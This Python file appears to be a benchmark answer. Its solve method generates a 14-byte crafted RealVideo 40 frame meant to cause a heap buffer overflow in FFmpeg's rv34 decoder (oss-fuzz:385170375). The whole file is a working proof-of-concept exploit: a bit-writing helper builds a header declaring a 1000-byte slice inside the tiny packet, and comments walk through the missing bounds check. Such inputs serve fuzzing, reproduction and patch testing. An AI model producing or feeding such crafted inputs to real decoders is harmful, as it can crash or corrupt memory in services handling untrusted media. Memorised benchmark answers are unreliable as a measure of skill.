import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept input that triggers a heap buffer overflow
        in the RealVideo 30/40 decoder (rv34.c).

        The vulnerability (oss-fuzz:385170375) lies in the `decode_slice_data`
        function. The code calculates slice offsets and sizes based on values
        read from the frame header. However, it fails to validate that the
        resulting memory region for a slice (`offset + size`) is within the
        bounds of the actual packet buffer (`h->slice_data->size`).

        This PoC exploits this by crafting a frame header that defines two slices.
        The first slice is small (1 byte). The second slice is declared with a large
        size (1000 bytes). The decoder calculates the offset for the second slice as 1
        (the end of the first slice) and its size as 1000. It then attempts to
        initialize a GetBitContext on a 1000-byte region starting at offset 1
        within a packet that is only 14 bytes long, causing a heap buffer overflow.

        The PoC consists of a 13-byte header followed by 1 byte of slice data.
        """

        class BitStream:
            """A helper class to write a stream of bits."""
            def __init__(self):
                self.data = bytearray()
                self.bit_buffer = 0
                self.bit_count = 0

            def put_bits(self, value: int, n: int):
                # Writes n bits from value in big-endian order.
                for i in range(n - 1, -1, -1):
                    bit = (value >> i) & 1
                    self.bit_buffer = (self.bit_buffer << 1) | bit
                    self.bit_count += 1
                    if self.bit_count == 8:
                        self.data.append(self.bit_buffer)
                        self.bit_buffer = 0
                        self.bit_count = 0

            def get_bytes(self) -> bytes:
                """Returns the constructed byte string, padding the last byte if necessary."""
                final_data = bytearray(self.data)
                if self.bit_count > 0:
                    final_data.append(self.bit_buffer << (8 - self.bit_count))
                return bytes(final_data)

        bs = BitStream()

        # Construct a valid RV40 frame header that will pass initial parsing
        # to reach the vulnerable slice processing logic.
        
        # Part 1: General frame header (parsed by rv34_decode_frame_header).
        # We set PTYPE to an I-frame (0) to trigger the parsing of width/height,
        # ensuring the header is considered complete.
        bs.put_bits(0xA4000, 20)  # RV40 marker (value must satisfy (val >> 12) == 0xA4)
        bs.put_bits(0, 1)         # PTYPE = 0 (I-frame)
        bs.put_bits(0, 13)        # PQUANT
        bs.put_bits(0, 1)         # A reserved bit

        # Part 2: Slice structure header.
        # We define 2 slices to set up the overflow condition.
        # num_slices = 2, so num_slices_minus_1 = 1.
        bs.put_bits(1, 8)

        # Part 3: Slice information.
        # Slice 1 info: A small slice of size 1 byte.
        bs.put_bits(0, 1)
        bs.put_bits(0, 2)
        bs.put_bits(1, 14)        # sz1 = 1

        # Slice 2 info: A large slice of size 1000 bytes.
        # This is the core of the exploit. The cumulative offset for this slice
        # will be 1 (from sz1), and its size is 1000.
        # The check `offset (1) + size (1000) > packet_size (14)` is missing
        # in the vulnerable version.
        bs.put_bits(0, 1)
        bs.put_bits(0, 2)
        bs.put_bits(1000, 14)     # sz2 = 1000

        # Part 4: I-frame specific header fields.
        # These fields are required for a PTYPE=0 frame header to be parsed successfully.
        bs.put_bits(0, 1)         # A reserved bit
        bs.put_bits(16, 12)       # width = 16 (must be > 0)
        bs.put_bits(0, 1)         # A reserved bit
        bs.put_bits(16, 12)       # height = 16 (must be > 0)

        # Generate the header bytes from the bitstream.
        # Total bits = 20+1+13+1+8 + (3+14)*2 + 1+12+1+12 = 103 bits.
        # This results in a 13-byte header.
        header = bs.get_bytes()

        # The actual slice data that follows the header.
        # Since slice 1 has a declared size of 1, we must provide 1 byte of data for it.
        slice1_data = b'\x00'
        
        # The final PoC is the concatenation of the crafted header and the minimal slice data.
        # The total size of the PoC will be 13 + 1 = 14 bytes.
        poc = header + slice1_data
        
        return poc